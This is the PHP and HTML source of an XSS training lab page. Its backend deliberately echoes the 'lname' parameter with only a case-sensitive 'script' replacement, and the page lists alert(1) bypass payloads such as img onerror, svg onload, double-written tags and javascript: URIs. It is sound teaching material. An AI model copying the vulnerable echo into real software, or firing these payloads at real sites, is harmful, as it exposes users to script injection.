<?php
if(isset($_GET["fname"]) && isset($_GET["lname"])){
    echo htmlspecialchars($_GET["fname"], ENT_QUOTES);
    $re = str_replace('script', '/', $_GET['lname']);
    echo $re;
}
elseif(isset($_GET["ptu"])){
    echo htmlspecialchars($_GET["ptu"], ENT_QUOTES);
}
?>

<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>KrazePlanetLabs - Mixed Filtering XSS Lab</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet"
    integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">

  <style>
    :root {
      --primary-dark: #1a1f36;
      --primary-light: #2d3748;
      --accent-green: #48bb78;
      --accent-blue: #4299e1;
      --accent-orange: #ed8936;
      --accent-red: #f56565;
      --accent-purple: #9f7aea;
      --accent-pink: #ed64a6;
    }
    
    body {
      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
      color: #e2e8f0;
      min-height: 100vh;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    .navbar-brand {
      font-weight: 700;
      font-size: 1.5rem;
      color: var(--accent-green) !important;
    }

    .nav-link {
      font-weight: 500;
      transition: color 0.3s;
    }

    .nav-link:hover {
      color: var(--accent-green) !important;
    }

    .hero-section {
      background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                  url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
      padding: 2rem 0;
      border-bottom: 1px solid #2d3748;
      margin-bottom: 2rem;
    }

    .hero-title {
      font-size: 2rem;
      font-weight: 700;
      background: linear-gradient(90deg, #48bb78, #4299e1);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 0.5rem;
    }

    .hero-subtitle {
      font-size: 1rem;
      color: #cbd5e0;
    }

    .section-title {
      margin-top: 30px;
      margin-bottom: 20px;
      font-weight: 700;
      font-size: 1.5rem;
      position: relative;
      padding-bottom: 10px;
    }

    .section-title::after {
      content: '';
      position: absolute;
      bottom: 0;
      left: 0;
      width: 60px;
      height: 4px;
      background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
      border-radius: 2px;
    }

    .card {
      background: rgba(30, 41, 59, 0.7);
      border-radius: 12px;
      border: 1px solid #334155;
      color: #e2e8f0;
    }

    .card-header {
      background: rgba(15, 23, 42, 0.5);
      border-bottom: 1px solid #334155;
      font-weight: 600;
      padding: 1rem 1.5rem;
    }

    .form-control {
      background: rgba(30, 41, 59, 0.7);
      border: 1px solid #334155;
      color: #e2e8f0;
      padding: 0.75rem 1rem;
    }

    .form-control:focus {
      background: rgba(30, 41, 59, 0.9);
      border-color: var(--accent-green);
      box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
      color: #e2e8f0;
    }

    .form-label {
      font-weight: 500;
      color: #cbd5e0;
    }

    .btn-primary {
      background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
      border: none;
      padding: 0.75rem 1.5rem;
      font-weight: 600;
      transition: all 0.3s;
    }

    .btn-primary:hover {
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
    }

    .search-box {
      background: rgba(30, 41, 59, 0.7);
      border: 1px solid #334155;
      color: #e2e8f0;
    }

    .search-box:focus {
      background: rgba(30, 41, 59, 0.9);
      border-color: var(--accent-green);
      box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
      color: #e2e8f0;
    }

    .btn-outline-success {
      border-color: var(--accent-green);
      color: var(--accent-green);
    }

    .btn-outline-success:hover {
      background-color: var(--accent-green);
      border-color: var(--accent-green);
      color: #1a202c;
    }

    pre {
      background: rgba(15, 23, 42, 0.7);
      border-radius: 8px;
      padding: 1.5rem;
      color: #e2e8f0;
      border: 1px solid #334155;
      overflow-x: auto;
      max-height: 300px;
      overflow-y: auto;
    }

    .output-section {
      background: rgba(30, 41, 59, 0.7);
      border-radius: 12px;
      border: 1px solid #334155;
      padding: 1.5rem;
      margin-top: 2rem;
    }

    .output-title {
      font-weight: 600;
      margin-bottom: 1rem;
      color: var(--accent-green);
    }

    .output-content {
      background: rgba(15, 23, 42, 0.7);
      border-radius: 8px;
      padding: 1rem;
      min-height: 60px;
      border: 1px solid #334155;
    }

    .lab-info {
      background: rgba(30, 41, 59, 0.7);
      border-radius: 12px;
      border: 1px solid #334155;
      padding: 1.5rem;
      margin-bottom: 2rem;
    }

    .lab-badge {
      background: linear-gradient(45deg, var(--accent-pink), var(--accent-purple));
      color: white;
      font-weight: 700;
      padding: 0.5rem 1rem;
      border-radius: 6px;
      display: inline-block;
      margin-bottom: 1rem;
    }

    .filter-info {
      background: rgba(30, 41, 59, 0.7);
      border-left: 4px solid var(--accent-pink);
      padding: 1rem 1.5rem;
      margin: 1.5rem 0;
      border-radius: 0 8px 8px 0;
    }

    .code-highlight {
      color: var(--accent-orange);
      font-weight: 600;
    }

    .filter-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
      gap: 0.5rem;
      margin-top: 1rem;
    }

    .filter-item {
      background: var(--accent-red);
      color: white;
      padding: 0.5rem;
      border-radius: 4px;
      text-align: center;
      font-size: 0.8rem;
      font-weight: 600;
    }

    .progress {
      height: 8px;
      background-color: #2d3748;
      margin: 1rem 0;
    }

    .progress-bar {
      background: linear-gradient(90deg, var(--accent-pink), var(--accent-purple));
    }

    .case-variations {
      background: rgba(15, 23, 42, 0.7);
      border-radius: 8px;
      padding: 1rem;
      margin-top: 1rem;
      border: 1px solid #334155;
    }

    .function-filter-notice {
      background: rgba(237, 100, 166, 0.1);
      border: 1px solid var(--accent-pink);
      border-radius: 8px;
      padding: 1rem;
      margin: 1rem 0;
    }

    .complete-badge {
      background: linear-gradient(45deg, var(--accent-pink), var(--accent-purple), var(--accent-red));
      color: white;
      padding: 0.75rem 1.5rem;
      border-radius: 25px;
      font-weight: bold;
      text-transform: uppercase;
      letter-spacing: 2px;
      display: inline-block;
      margin-bottom: 1rem;
      animation: pulse-complete 2s infinite alternate;
      text-shadow: 0 0 10px rgba(237, 100, 166, 0.5);
    }

    .mixed-filter-badge {
      background: linear-gradient(45deg, var(--accent-orange), var(--accent-purple));
      color: white;
      padding: 0.75rem 1.5rem;
      border-radius: 25px;
      font-weight: bold;
      text-transform: uppercase;
      letter-spacing: 2px;
      display: inline-block;
      margin-bottom: 1rem;
      animation: pulse-mixed 2s infinite alternate;
      text-shadow: 0 0 10px rgba(237, 137, 54, 0.5);
    }

    @keyframes pulse-complete {
      0% { 
        box-shadow: 0 0 10px var(--accent-pink); 
        transform: scale(1);
      }
      100% { 
        box-shadow: 0 0 20px var(--accent-pink), 0 0 30px var(--accent-purple); 
        transform: scale(1.02);
      }
    }

    @keyframes pulse-mixed {
      0% { 
        box-shadow: 0 0 10px var(--accent-orange); 
        transform: scale(1);
      }
      100% { 
        box-shadow: 0 0 20px var(--accent-orange), 0 0 30px var(--accent-purple); 
        transform: scale(1.02);
      }
    }

    .tool-tip {
      background: rgba(15, 23, 42, 0.9);
      border: 1px solid var(--accent-blue);
      border-radius: 8px;
      padding: 1rem;
      margin: 1rem 0;
    }

    .arjun-tool-info {
      background: rgba(66, 153, 225, 0.1);
      border: 1px solid var(--accent-blue);
      border-radius: 8px;
      padding: 1rem;
      margin: 1rem 0;
    }

    .param-security-level {
      display: inline-block;
      padding: 0.25rem 0.75rem;
      border-radius: 20px;
      font-size: 0.75rem;
      font-weight: 600;
      margin-left: 0.5rem;
    }

    .security-high {
      background-color: var(--accent-green);
      color: #1a202c;
    }

    .security-medium {
      background-color: var(--accent-orange);
      color: #1a202c;
    }

    .security-low {
      background-color: var(--accent-red);
      color: white;
    }

    .tab-content {
      background: rgba(30, 41, 59, 0.7);
      border: 1px solid #334155;
      border-top: none;
      border-radius: 0 0 12px 12px;
      padding: 1.5rem;
    }

    .nav-tabs {
      border-bottom: 1px solid #334155;
    }

    .nav-tabs .nav-link {
      background: rgba(30, 41, 59, 0.7);
      border: 1px solid #334155;
      border-bottom: none;
      color: #cbd5e0;
      border-radius: 8px 8px 0 0;
      margin-right: 0.25rem;
    }

    .nav-tabs .nav-link.active {
      background: rgba(15, 23, 42, 0.9);
      border-color: #334155 #334155 transparent;
      color: var(--accent-green);
      font-weight: 600;
    }

    .nav-tabs .nav-link:hover {
      border-color: #334155 #334155 transparent;
      color: var(--accent-green);
    }

    .filter-demo {
      background: rgba(15, 23, 42, 0.7);
      border-radius: 8px;
      padding: 1rem;
      margin: 1rem 0;
      border: 1px solid #334155;
    }
  </style>
</head>
<body>
  <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
    <div class="container-fluid">
      <a class="navbar-brand" href="/">
        <i class="bi bi-shield-shaded me-2"></i>KrazePlanetLabs
      </a>
      <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
        data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
        aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>

      <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav me-auto mb-2 mb-lg-0">
          <li class="nav-item">
            <a class="nav-link active" href="../../about">About</a>
          </li>
          <li class="nav-item">
            <a class="nav-link active" href="../../contact">Contact Us</a>
          </li>
          <li class="nav-item dropdown">
            <a class="nav-link dropdown-toggle active" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
              Categories
            </a>
            <ul class="dropdown-menu">
              <li><a class="dropdown-item" href="#">Reflected XSS</a></li>
              <li><a class="dropdown-item" href="#">Stored XSS</a></li>
              <li><a class="dropdown-item" href="#">DOM XSS</a></li>
              <li><a class="dropdown-item" href="#">Blind XSS</a></li>
            </ul>
          </li>
        </ul>
        <form class="d-flex" role="search">
          <input class="form-control search-box me-2" type="search" placeholder="Search labs..." aria-label="Search">
          <button class="btn btn-outline-success" type="submit">Search</button>
        </form>
      </div>
    </div>
  </nav>

  <div class="hero-section">
    <div class="container">
      <h1 class="hero-title">Mixed Filtering XSS Lab</h1>
      <p class="hero-subtitle">Test XSS with different filtering approaches in the same application</p>
    </div>
  </div>

  <div class="container mb-5">
    <div class="lab-info">
      <div class="mixed-filter-badge">Mixed Filtering Challenge</div>
      <h3 class="section-title">Lab Overview</h3>
      <p>This lab demonstrates mixed security implementations where different parameters use different filtering approaches, creating a complex security landscape.</p>
      
      <div class="function-filter-notice">
        <i class="bi bi-exclamation-triangle me-2"></i><strong>Mixed Implementation:</strong> The application uses different security controls for different parameters, creating potential security gaps.
      </div>
      
      <div class="arjun-tool-info">
        <i class="bi bi-tools me-2"></i><strong>Hidden Parameter:</strong> There's a hidden parameter not shown in the main form. Use tools like Arjun to discover it!
        <div class="mt-2">
          <code># use arjun tool to find hidden parameter</code>
        </div>
      </div>
      
      <div class="filter-info">
        <i class="bi bi-funnel me-2"></i><strong>Parameter Security Levels:</strong>
        <div class="case-variations">
          <div class="row mt-2">
            <div class="col-md-6">
              <div class="d-flex align-items-center mb-2">
                <span class="param-security-level security-high">Secure</span>
                <span class="ms-2">fname - Uses htmlspecialchars()</span>
              </div>
              <div class="d-flex align-items-center mb-2">
                <span class="param-security-level security-medium">Partial Filter</span>
                <span class="ms-2">lname - Replaces 'script' with '/'</span>
              </div>
            </div>
            <div class="col-md-6">
              <div class="d-flex align-items-center mb-2">
                <span class="param-security-level security-high">Secure</span>
                <span class="ms-2">ptu - Uses htmlspecialchars()</span>
              </div>
              <div class="d-flex align-items-center">
                <span class="badge bg-warning me-2">Mixed</span>
                <span>Different filters for different parameters</span>
              </div>
            </div>
          </div>
        </div>
      </div>
      
      <div class="filter-demo">
        <h6>Filter Demonstration:</h6>
        <div class="row">
          <div class="col-md-6">
            <strong>Input:</strong> <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>
          </div>
          <div class="col-md-6">
            <strong>After lname filter:</strong> <code>&lt;/&gt;alert(1)&lt;/&gt;</code>
          </div>
        </div>
        <div class="mt-2">
          <small>The 'script' string is replaced with '/', which can create interesting bypass opportunities.</small>
        </div>
      </div>
      
      <div class="mt-3">
        <div class="d-flex justify-content-between align-items-center">
          <span>Overall Security Level:</span>
          <span class="text-warning">Inconsistent Implementation</span>
        </div>
        <div class="progress">
          <div class="progress-bar" style="width: 60%"></div>
        </div>
      </div>
      
      <p><strong>Objective:</strong> Test XSS payloads against the mixed filtering implementation and find ways to bypass the partial filter in the lname parameter.</p>
    </div>

    <div class="row">
      <div class="col-lg-6">
        <div class="card mb-4">
          <div class="card-header text-center">
            <i class="bi bi-code-slash me-2"></i>Backend Source Code
          </div>
          <div class="card-body">
            <pre>
if(isset($_GET["fname"]) && isset($_GET["lname"])){
    echo htmlspecialchars($_GET["fname"], ENT_QUOTES);
    $re = str_replace('script', '/', $_GET['lname']);
    echo $re;
}
elseif(isset($_GET["ptu"])){
    echo htmlspecialchars($_GET["ptu"], ENT_QUOTES);
}
# use arjun tool to find hidden parameter</pre>
          </div>
        </div>
      </div>
      
      <div class="col-lg-6">
        <div class="card">
          <div class="card-header">
            <i class="bi bi-input-cursor-text me-2"></i>Test Input Forms
          </div>
          <div class="card-body">
            <ul class="nav nav-tabs" id="paramTabs" role="tablist">
              <li class="nav-item" role="presentation">
                <button class="nav-link active" id="visible-tab" data-bs-toggle="tab" data-bs-target="#visible" type="button" role="tab">Visible Parameters</button>
              </li>
              <li class="nav-item" role="presentation">
                <button class="nav-link" id="hidden-tab" data-bs-toggle="tab" data-bs-target="#hidden" type="button" role="tab">Hidden Parameter</button>
              </li>
            </ul>
            <div class="tab-content" id="paramTabsContent">
              <div class="tab-pane fade show active" id="visible" role="tabpanel">
                <h5 class="mb-3">Visible Parameters (Mixed Filtering)</h5>
                <form action="" method="get" class="mb-4">
                  <div class="mb-3">
                    <label for="fname" class="form-label">First Name <span class="param-security-level security-high">Secure</span></label>
                    <input class="form-control" type="text" placeholder="Enter first name" aria-label="First name" name="fname" value="<?php echo isset($_GET['fname']) ? htmlspecialchars($_GET['fname']) : ''; ?>">
                    <div class="form-text">This parameter uses htmlspecialchars() encoding</div>
                  </div>
                  <div class="mb-3">
                    <label for="lname" class="form-label">Last Name <span class="param-security-level security-medium">Partial Filter</span></label>
                    <input class="form-control" type="text" placeholder="Enter last name" aria-label="Last name" name="lname" value="<?php echo isset($_GET['lname']) ? htmlspecialchars($_GET['lname']) : ''; ?>">
                    <div class="form-text">This parameter replaces 'script' with '/' (case-sensitive)</div>
                  </div>
                  <button type="submit" class="btn btn-primary mt-3">Test Mixed Filtering</button>
                </form>
              </div>
              <div class="tab-pane fade" id="hidden" role="tabpanel">
                <h5 class="mb-3">Hidden Parameter</h5>
                <div class="tool-tip">
                  <i class="bi bi-info-circle me-2"></i><strong>Hint:</strong> The 'ptu' parameter is not shown in the main form but is implemented in the backend.
                </div>
                <form action="" method="get">
                  <div class="mb-3">
                    <label for="ptu" class="form-label">Parameter 'ptu' <span class="param-security-level security-high">Secure</span></label>
                    <input class="form-control" type="text" placeholder="Enter ptu value" aria-label="ptu" name="ptu" value="<?php echo isset($_GET['ptu']) ? htmlspecialchars($_GET['ptu']) : ''; ?>">
                    <div class="form-text">This parameter uses htmlspecialchars() encoding</div>
                  </div>
                  <button type="submit" class="btn btn-primary mt-3">Test Hidden Parameter</button>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <?php if(isset($_GET["fname"]) && isset($_GET["lname"])): ?>
    <div class="output-section">
      <div class="output-title">
        <i class="bi bi-arrow-return-right me-2"></i>Mixed Parameters Output
      </div>
      <div class="output-content">
        <?php 
          echo htmlspecialchars($_GET["fname"], ENT_QUOTES);
          $re = str_replace('script', '/', $_GET['lname']);
          echo $re;
        ?>
      </div>
      <div class="mt-3">
        <?php if($_GET['lname'] !== $re): ?>
          <small class="text-warning"><i class="bi bi-exclamation-triangle me-1"></i>Last Name filter has modified your input (replaced 'script' with '/')</small>
        <?php else: ?>
          <small class="text-success"><i class="bi bi-check-circle me-1"></i>First Name is safely encoded with htmlspecialchars()</small>
        <?php endif; ?>
      </div>
    </div>
    <?php endif; ?>

    <?php if(isset($_GET["ptu"])): ?>
    <div class="output-section">
      <div class="output-title">
        <i class="bi bi-arrow-return-right me-2"></i>Parameter 'ptu' Output (HTML Encoded)
      </div>
      <div class="output-content">
        <?php 
          echo htmlspecialchars($_GET["ptu"], ENT_QUOTES);
        ?>
      </div>
      <div class="mt-3">
        <small class="text-success"><i class="bi bi-check-circle me-1"></i>Output is safely encoded with htmlspecialchars()</small>
      </div>
    </div>
    <?php endif; ?>

    <div class="row mt-4">
      <div class="col-12">
        <div class="card">
          <div class="card-header">
            <i class="bi bi-lightbulb me-2"></i>Bypass Techniques for Partial Filter
          </div>
          <div class="card-body">
            <div class="row">
              <div class="col-md-6">
                <h6>Case Variation Bypasses:</h6>
                <ul>
                  <li><code>&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</code> - Uppercase</li>
                  <li><code>&lt;Script&gt;alert(1)&lt;/Script&gt;</code> - Capitalized</li>
                  <li><code>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</code> - Mixed case</li>
                </ul>
              </div>
              <div class="col-md-6">
                <h6>Alternative Tag Vectors:</h6>
                <ul>
                  <li><code>&lt;img src=x onerror=alert(1)&gt;</code> - Image error handler</li>
                  <li><code>&lt;body onload=alert(1)&gt;</code> - Body load event</li>
                  <li><code>&lt;svg onload=alert(1)&gt;</code> - SVG load event</li>
                </ul>
              </div>
            </div>
            <div class="row mt-3">
              <div class="col-12">
                <h6>Replacement Filter Exploitation:</h6>
                <ul>
                  <li><code>&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;</code> - Double writing</li>
                  <li><code>&lt;scr/ipt&gt;alert(1)&lt;/scr/ipt&gt;</code> - Using the replacement character</li>
                  <li><code>&lt;scr"+"ipt&gt;alert(1)&lt;/scr"+"ipt&gt;</code> - String concatenation</li>
                  <li>Try payloads where 'script' becomes valid HTML after replacement</li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="row mt-4">
      <div class="col-md-6">
        <div class="card">
          <div class="card-header">
            <i class="bi bi-shield-exclamation me-2"></i>Security Implications
          </div>
          <div class="card-body">
            <p>Mixed filtering implementations create:</p>
            <ul>
              <li>Inconsistent security controls across the application</li>
              <li>False sense of security from partial filtering</li>
              <li>Complex attack surface with different bypass techniques</li>
              <li>Maintenance challenges for security teams</li>
              <li>Difficulty in comprehensive security testing</li>
              <li>Potential for overlooked vulnerabilities</li>
            </ul>
          </div>
        </div>
      </div>
      <div class="col-md-6">
        <div class="card">
          <div class="card-header">
            <i class="bi bi-check-circle me-2"></i>Best Practices
          </div>
          <div class="card-body">
            <p>For consistent security:</p>
            <ul>
              <li>Use uniform output encoding across all parameters</li>
              <li>Avoid partial or incomplete filtering</li>
              <li>Implement Content Security Policy (CSP) headers</li>
              <li>Use context-aware encoding for different output contexts</li>
              <li>Conduct comprehensive security testing</li>
              <li>Document all security controls and implementations</li>
              <li>Use security headers: X-XSS-Protection, X-Content-Type-Options</li>
            </ul>
          </div>
        </div>
      </div>
    </div>

    <div class="row mt-4">
      <div class="col-12">
        <div class="card">
          <div class="card-header">
            <i class="bi bi-code-square me-2"></i>Advanced Bypass Examples
          </div>
          <div class="card-body">
            <div class="row">
              <div class="col-md-6">
                <h6>Replacement Exploitation:</h6>
                <ul>
                  <li><code>&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;</code></li>
                  <li><code>&lt;scr/ipt&gt;alert(1)&lt;/scr/ipt&gt;</code></li>
                  <li><code>scrscriptipt:alert(1)</code> - For JavaScript URLs</li>
                </ul>
              </div>
              <div class="col-md-6">
                <h6>Alternative Execution Methods:</h6>
                <ul>
                  <li><code>&lt;img src=x onerror=alert(1)&gt;</code></li>
                  <li><code>&lt;svg onload=alert(1)&gt;</code></li>
                  <li><code>&lt;iframe src="javascript:alert(1)"&gt;</code></li>
                  <li><code>&lt;object data="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;</code></li>
                </ul>
              </div>
            </div>
            <div class="row mt-3">
              <div class="col-12">
                <h6>Creative Bypass Techniques:</h6>
                <ul>
                  <li>Use HTML entities: <code>&lt;scr&#x69;pt&gt;alert(1)&lt;/scr&#x69;pt&gt;</code></li>
                  <li>Use Unicode: <code>&lt;scr\u0069pt&gt;alert(1)&lt;/scr\u0069pt&gt;</code></li>
                  <li>Use data URIs: <code>&lt;object data="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;</code></li>
                  <li>Use JavaScript pseudo-protocol: <code>javascript:alert(1)</code></li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa"
    crossorigin="anonymous"></script>
</body>
</html>